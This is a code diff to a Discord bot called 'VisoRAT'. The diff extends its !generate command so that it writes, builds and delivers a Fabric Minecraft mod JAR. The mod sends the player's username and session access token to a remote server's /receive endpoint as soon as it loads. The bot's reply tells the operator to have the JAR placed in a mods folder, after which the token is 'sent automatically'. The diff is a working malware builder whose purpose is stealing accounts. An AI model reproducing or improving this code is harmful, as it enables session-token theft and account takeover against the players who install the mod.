@@ -8,6 +8,10 @@ import discord
 from discord.ext import commands
 import threading
 import asyncio
+import tempfile
+import shutil
+import subprocess
+import glob
 
 app = Flask(__name__)
 
@@ -73,7 +77,8 @@ def load_config():
                 "bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE",
                 "admin_role_id": 0,
                 "guild_id": 0
-            }
+            },
+            "server_url": "https://visorat-1-kzc9.onrender.com"
         }
         with open('config.json', 'w') as f:
             json.dump(default_config, f, indent=4)
@@ -297,10 +302,6 @@ bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 async def on_ready():
     print(f"[BOT] Logged in as {bot.user} (ID: {bot.user.id})")
     print(f"[BOT] Connected to {len(bot.guilds)} guild(s)")
-    # Only print once
-    if hasattr(on_ready, 'printed'):
-        return
-    on_ready.printed = True
 
 
 @bot.event
@@ -308,11 +309,11 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         return
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send(f"❌ Missing arguments: `{error.param}`")
+        await ctx.send(f"Missing arguments: `{error.param}`")
     elif isinstance(error, IndexError):
-        await ctx.send("❌ Not enough webhook URLs provided. Use: `!webhook <url1> <url2> <url3>`")
+        await ctx.send("Not enough webhook URLs provided. Use: `!webhook <url1> <url2> <url3>`")
     else:
-        await ctx.send(f"❌ Error: `{error}`")
+        await ctx.send(f"Error: `{error}`")
     print(f"[BOT ERROR] {error}")
 
 
@@ -328,7 +329,7 @@ async def status_cmd(ctx):
     print(f"[BOT] !status called by {ctx.author} in #{ctx.channel}")
     member = ctx.guild.get_member(ctx.author.id)
     if not user_has_admin_role(member):
-        await ctx.send("❌ You need the admin role to use this command.")
+        await ctx.send("You need the admin role to use this command.")
         return
 
     sec = config.get("security", {})
@@ -338,32 +339,32 @@ async def status_cmd(ctx):
     embed = discord.Embed(title="VisoRAT Status", color=0x00ff00,
                           timestamp=datetime.utcnow())
     embed.add_field(
-        name="🔒 Security",
+        name="Security",
         value=f"```yaml\nRate limit: {sec.get('rate_limit_seconds', 600)}s\n"
               f"Min token: {sec.get('min_token_length', 128)} chars\n"
               f"Dupe check: {sec.get('check_duplicate_tokens', True)}\n```",
         inline=False)
 
     role = ctx.guild.get_role(disc.get("admin_role_id"))
-    embed.add_field(name="👑 Admin Role",
+    embed.add_field(name="Admin Role",
                     value=f"`{disc.get('admin_role_id')}`\n"
                           f"{role.mention if role else 'Anyone'}",
                     inline=False)
 
     wh_text = ""
     for path, ep in eps.items():
-        path_name = "📨 /receive" if path == "/receive" else "🔐 /auth"
+        path_name = "/receive" if path == "/receive" else "/auth"
         wh_text += f"{path_name}:\n"
         for i, wh in enumerate(ep.get("webhooks", []), 1):
             name = wh.get("name", "Unnamed")
             url = wh.get("url", "")
-            status = "🟢" if not url.startswith("YOUR_") else "🔴"
+            status = "Configured" if not url.startswith("YOUR_") else "Not Set"
             preview = url[:37] + "…" if len(url) > 37 else url
-            wh_text += f"  {status} `{i}.` **{name}** → `{preview}`\n"
+            wh_text += f"  `{i}.` **{name}** → `{preview}`\n"
         wh_text += "\n"
 
-    embed.add_field(name="🌐 Webhooks", value=wh_text or "`None configured`", inline=False)
-    embed.add_field(name="📡 Endpoints",
+    embed.add_field(name="Webhooks", value=wh_text or "`None configured`", inline=False)
+    embed.add_field(name="Endpoints",
                     value=f"```\n" + "\n".join([f"POST {p}" for p in eps.keys()]) + "\n```",
                     inline=False)
 
@@ -376,17 +377,16 @@ async def webhook_cmd(ctx, *args):
     print(f"[BOT] !webhook called with {len(args)} args")
     member = ctx.guild.get_member(ctx.author.id)
     if not user_has_admin_role(member):
-        await ctx.send("❌ Admin role required.")
+        await ctx.send("Admin role required.")
         return
 
     if len(args) < 3:
-        embed = discord.Embed(title="❌ Invalid Usage", color=0xff0000,
+        embed = discord.Embed(title="Invalid Usage", color=0xff0000,
                               description="**Format:** `!webhook <url1> [name1] <url2> [name2] <url3> [name3]`\n\n"
                                         "**Example:** `!webhook https://discord.com/... MyWH1 https://discord.com/... MyWH2 https://discord.com/... MyWH3`")
         await ctx.send(embed=embed)
         return
 
-    # Parse URLs and names safely
     urls = []
     names = []
     i = 0
@@ -395,7 +395,6 @@ async def webhook_cmd(ctx, *args):
         if url.startswith("http"):
             urls.append(url)
             i += 1
-            # Optional name
             if i < len(args) and not args[i].startswith("http"):
                 names.append(args[i])
                 i += 1
@@ -405,10 +404,9 @@ async def webhook_cmd(ctx, *args):
             i += 1
 
     if len(urls) < 3:
-        await ctx.send("❌ Need exactly 3 webhook URLs. (URLs must start with `http://` or `https://`)")
+        await ctx.send("Need exactly 3 webhook URLs. (URLs must start with `http://` or `https://`)")
         return
 
-    # Update config
     base_wh = {"footer": "VisoRAT", "color": 7414964, "avatar_url": "https://bigrat.monster/media/bigrat.jpg"}
     
     config["endpoints"]["/receive"]["webhooks"] = [
@@ -421,9 +419,9 @@ async def webhook_cmd(ctx, *args):
     
     save_config()
     
-    embed = discord.Embed(title="✅ Webhooks Updated", color=0x00ff00)
-    embed.add_field(name="📨 /receive", value=f"**1.** {names[0]}\n**2.** {names[1]}", inline=True)
-    embed.add_field(name="🔐 /auth", value=f"**1.** {names[2]}", inline=True)
+    embed = discord.Embed(title="Webhooks Updated", color=0x00ff00)
+    embed.add_field(name="/receive", value=f"**1.** {names[0]}\n**2.** {names[1]}", inline=True)
+    embed.add_field(name="/auth", value=f"**1.** {names[2]}", inline=True)
     await ctx.send(embed=embed)
 
 
@@ -431,13 +429,13 @@ async def webhook_cmd(ctx, *args):
 async def role_cmd(ctx, role_id: int):
     member = ctx.guild.get_member(ctx.author.id)
     if not user_has_admin_role(member):
-        await ctx.send("❌ Admin role required.")
+        await ctx.send("Admin role required.")
         return
 
     config["discord"]["admin_role_id"] = role_id
     save_config()
     role = ctx.guild.get_role(role_id)
-    await ctx.send(f"✅ Admin role set to {role.mention if role else f'`{role_id}`'}")
+    await ctx.send(f"Admin role set to {role.mention if role else f'`{role_id}`'}")
 
 
 @bot.command(name="generate")
@@ -445,36 +443,30 @@ async def generate_cmd(ctx):
     print(f"[BOT] !generate called by {ctx.author}")
     member = ctx.guild.get_member(ctx.author.id)
     if not user_has_admin_role(member):
-        await ctx.send("❌ Admin role required.")
+        await ctx.send("Admin role required.")
         return
 
-    # Get server URL from config or use default
     server_url = config.get("server_url", "https://visorat-1-kzc9.onrender.com")
-    
-    # Generate the Java mod code
-    mod_code = f'''package me.visoxd;
+
+    # === Java Source Code ===
+    java_code = f'''package me.visoxd;
 
 import net.fabricmc.api.ModInitializer;
 import net.minecraft.client.MinecraftClient;
-import me.visoxd.handlers.Minecraft;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class VisoMod implements ModInitializer {{
-
     @Override
     public void onInitialize() {{
         new Thread(() -> {{
             try {{
                 MinecraftClient client = MinecraftClient.getInstance();
-                Minecraft minecraft = new Minecraft(client);
-
-                String username = minecraft.getUsername();
-                String token = minecraft.getSessionId();
+                String username = client.getSession().getUsername();
+                String token = client.getSession().getAccessToken();
 
                 sendToServer(username, token);
-
             }} catch (Exception e) {{
                 e.printStackTrace();
             }}
@@ -483,53 +475,160 @@ public class VisoMod implements ModInitializer {{
 
     private void sendToServer(String username, String token) {{
         try {{
-            HttpURLConnection conn = (HttpURLConnection) new URL("{server_url}").openConnection();
+            HttpURLConnection conn = (HttpURLConnection) new URL("{server_url}/receive").openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
             conn.setDoOutput(true);
             conn.setConnectTimeout(5000);
             conn.setReadTimeout(5000);
 
-            String json = String.format(
-                    "\\{{"username":"%s","token":"%s"\\}}",
-                    username, token
-            );
+            String json = String.format("\\{{\\"username\\\":\\\"%s\\\",\\\"token\\\":\\\"%s\\\"\\}}", username, token);
 
             try (OutputStream os = conn.getOutputStream()) {{
                 os.write(json.getBytes());
             }}
 
-            int responseCode = conn.getResponseCode();
-            System.out.println("Server Response: " + responseCode);
-
+            System.out.println("VisoRAT: Sent to server");
         }} catch (Exception e) {{
-            System.out.println("Failed to send to server: " + e.getMessage());
+            System.out.println("VisoRAT: Failed to send: " + e.getMessage());
         }}
     }}
 }}
 '''
 
-    # Create file
-    filename = f"VisoMod_{int(time.time())}.java"
-    with open(filename, 'w') as f:
-        f.write(mod_code)
-    
-    # Send as attachment
-    with open(filename, 'rb') as f:
-        file = discord.File(f, filename=filename)
-    
-    embed = discord.Embed(title="🎮 Minecraft Mod Generated", color=0x00ff00,
-                          description=f"**File:** `{filename}`\n"
-                                     f"**Server:** `{server_url}`\n\n"
-                                     f"**Instructions:**\n"
-                                     f"1. Create new Fabric mod project\n"
-                                     f"2. Replace `src/main/java/.../YourMod.java` with this file\n"
-                                     f"3. Update `fabric.mod.json` with mod ID\n"
-                                     f"4. Build with `./gradlew build`\n"
-                                     f"5. Distribute `.jar`")
-    
+    # === fabric.mod.json ===
+    mod_json = '''{
+  "schemaVersion": 1,
+  "id": "visomod",
+  "version": "1.0.0",
+  "name": "VisoMod",
+  "description": "Sends session data to VisoRAT server.",
+  "authors": ["VisoRAT"],
+  "contact": {{}},
+  "license": "MIT",
+  "environment": "client",
+  "entrypoints": {{
+    "main": ["me.visoxd.VisoMod"]
+  }},
+  "depends": {{
+    "fabricloader": ">=0.15.0",
+    "minecraft": ">=1.20.1",
+    "java": ">=17"
+  }}
+}
+'''
+
+    # === gradle.properties ===
+    gradle_props = '''org.gradle.jvmargs=-Xmx1G
+'''
+
+    # === build.gradle ===
+    build_gradle = '''plugins {{
+    id 'fabric-loom' version '1.7.+'
+    id 'maven-publish'
+}}
+
+version = project.mod_version
+group = project.maven_group
+
+repositories {{
+    mavenCentral()
+}}
+
+dependencies {{
+    minecraft "com.mojang:minecraft:1.20.1"
+    mappings "net.fabricmc:yarn:1.20.1+build.10:v2"
+    modImplementation "net.fabricmc:fabric-loader:0.15.11"
+}}
+
+processResources {{
+    inputs.property "version", project.version
+    filesMatching("fabric.mod.json") {{
+        expand "version": project.version
+    }}
+}}
+
+java {{
+    withSourcesJar()
+    sourceCompatibility = JavaVersion.VERSION_17
+    targetCompatibility = JavaVersion.VERSION_17
+}}
+
+jar {{
+    from("LICENSE") {{
+        rename {{ "${{it}}_{{project.archivesBaseName}}" }}
+    }}
+}}
+'''
+
+    # === settings.gradle ===
+    settings_gradle = '''rootProject.name = "visomod"
+'''
+
+    # === Create temp project ===
+    project_dir = tempfile.mkdtemp()
+    src_dir = os.path.join(project_dir, "src", "main", "java", "me", "visoxd")
+    resources_dir = os.path.join(project_dir, "src", "main", "resources")
+    os.makedirs(src_dir, exist_ok=True)
+    os.makedirs(resources_dir, exist_ok=True)
+
+    # Write files
+    with open(os.path.join(src_dir, "VisoMod.java"), "w") as f:
+        f.write(java_code)
+    with open(os.path.join(resources_dir, "fabric.mod.json"), "w") as f:
+        f.write(mod_json)
+    with open(os.path.join(project_dir, "gradle.properties"), "w") as f:
+        f.write(gradle_props)
+    with open(os.path.join(project_dir, "build.gradle"), "w") as f:
+        f.write(build_gradle)
+    with open(os.path.join(project_dir, "settings.gradle"), "w") as f:
+        f.write(settings_gradle)
+
+    # === Build JAR ===
+    try:
+        print("[BOT] Building JAR...")
+        result = subprocess.run(
+            ["./gradlew", "build", "--no-daemon"],
+            cwd=project_dir,
+            capture_output=True,
+            text=True,
+            timeout=180
+        )
+        if result.returncode != 0:
+            raise Exception(f"Gradle failed: {result.stderr[-500:]}")
+        
+        # Find the first .jar in build/libs
+        jar_files = glob.glob(os.path.join(project_dir, "build", "libs", "*.jar"))
+        if not jar_files:
+            raise Exception("No JAR found in build/libs")
+        jar_path = jar_files[0]  # Take first one
+        print(f"[BOT] JAR built: {os.path.basename(jar_path)}")
+    except Exception as e:
+        await ctx.send(f"Build failed: `{str(e)[:1000]}`")
+        shutil.rmtree(project_dir)
+        return
+
+    # === Send JAR ===
+    with open(jar_path, "rb") as f:
+        file = discord.File(f, filename=os.path.basename(jar_path))
+
+    embed = discord.Embed(
+        title="Minecraft Mod Generated",
+        color=0x00ff00,
+        description=f"**File:** `{os.path.basename(jar_path)}`\n"
+                    f"**Server:** `{server_url}/receive`\n\n"
+                    f"**How to use:**\n"
+                    f"1. Install Fabric Loader\n"
+                    f"2. Place JAR in `mods` folder\n"
+                    f"3. Launch Minecraft\n"
+                    f"4. Token sent automatically")
+    embed.set_footer(text="VisoRAT • Built on-demand")
+
     await ctx.send(embed=embed, file=file)
-    print(f"[BOT] Generated mod file for {ctx.author}")
+    print(f"[BOT] Sent {os.path.basename(jar_path)} to {ctx.author}")
+
+    # Cleanup
+    shutil.rmtree(project_dir)
 
 
 def run_bot():
